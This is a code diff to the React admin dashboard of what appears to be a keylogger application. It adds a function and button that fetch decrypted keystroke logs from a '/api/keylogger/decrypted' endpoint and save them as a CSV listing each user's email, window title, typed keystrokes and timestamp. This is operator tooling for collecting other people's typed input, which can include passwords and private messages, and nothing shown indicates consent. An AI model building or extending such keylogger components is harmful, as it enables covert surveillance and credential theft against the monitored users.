@@ -2,6 +2,7 @@ import React, { useContext, useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { AppContent } from "../context/AppContext";
 import axios from "axios";
+import { saveAs } from "file-saver";
 import KeystrokeMonitor from "../components/KeyStrokeMonitor";
 
 const AdminDashboard = () => {
@@ -28,7 +29,7 @@ const AdminDashboard = () => {
 
         if (usersRes.data.success) setUsers(usersRes.data.users);
         if (keystrokesRes.data.success)
-          setKeystrokes(keystrokesRes.data.keystrokes); // Store keystrokes data
+          setKeystrokes(keystrokesRes.data.keystrokes);
       } catch (error) {
         console.error("Admin data fetch error:", error);
       } finally {
@@ -39,8 +40,44 @@ const AdminDashboard = () => {
     fetchData();
   }, [userData, navigate, backendUrl]);
 
+  //  DOWNLOAD decrypted logs as CSV
+  const downloadDecryptedLogs = async () => {
+    try {
+      const { data } = await axios.get(
+        `${backendUrl}/api/keylogger/decrypted`,
+        { withCredentials: true }
+      );
+
+      if (!data.success) {
+        return alert("Failed to fetch decrypted logs");
+      }
+
+      const logs = data.logs;
+
+      const csvRows = [
+        ["User Email", "Window Title", "Keystrokes", "Timestamp"], // headers
+        ...logs.map((log) => [
+          log.userId?.email || "N/A",
+          log.windowTitle,
+          log.keystrokes.replace(/\n/g, "\\n"), // escape newlines for CSV
+          new Date(log.createdAt).toLocaleString(),
+        ]),
+      ];
+
+      const csvString = csvRows
+        .map((row) => row.map((field) => `"${field}"`).join(","))
+        .join("\n");
+
+      const blob = new Blob([csvString], { type: "text/csv;charset=utf-8;" });
+      saveAs(blob, "decrypted_keystrokes.csv");
+    } catch (error) {
+      console.error("Download failed:", error);
+      alert("Error downloading decrypted logs");
+    }
+  };
+
   if (userData?.role !== "admin") {
-    return null; // If not admin, return null (redirect handled)
+    return null;
   }
 
   if (loading) {
@@ -67,7 +104,17 @@ const AdminDashboard = () => {
           </div>
         </div>
 
-        {/* Render Keystroke Monitor with the fetched keystrokes data */}
+        {/*  Decrypted download button */}
+        <div className="mb-6">
+          <button
+            onClick={downloadDecryptedLogs}
+            className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded"
+          >
+            Download Decrypted Keystrokes
+          </button>
+        </div>
+
+        {/* Render Keystroke Monitor with encrypted data */}
         <KeystrokeMonitor keystrokes={keystrokes} />
       </div>
     </div>
